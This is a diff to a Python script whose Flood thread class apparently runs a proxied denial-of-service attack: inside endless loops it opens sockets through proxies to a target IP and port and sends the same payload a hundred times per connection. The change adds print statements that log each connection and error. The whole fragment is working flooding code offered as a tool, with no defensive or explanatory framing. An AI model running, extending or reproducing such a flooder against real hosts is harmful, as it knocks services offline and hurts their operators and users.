@@ -120,10 +120,13 @@ class Flood(threading.Thread):
                             data = s.recv(1024)
                             try:
                                 for y in range(100):
+                                    print('Socket',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                                     s.send(str.encode(data_data))
                             except:
+                                print('Error',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                                 s.close()
                         except:
+                            print('Error',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                             s.close()
                 else:
                     while True:
@@ -134,10 +137,13 @@ class Flood(threading.Thread):
                             data = s.recv(1024)
                             try:
                                 for y in range(100):
+                                    print('Socket',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                                     s.send(str.encode(data_data))
                             except:
+                                print('Error',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                                 s.close()
                         except:
+                            print('Error',str(proxy[0]),':', int(proxy[1]),'----->Connect to',ip+':'+port)
                             s.close()				
 				
 if __name__ == "__main__":
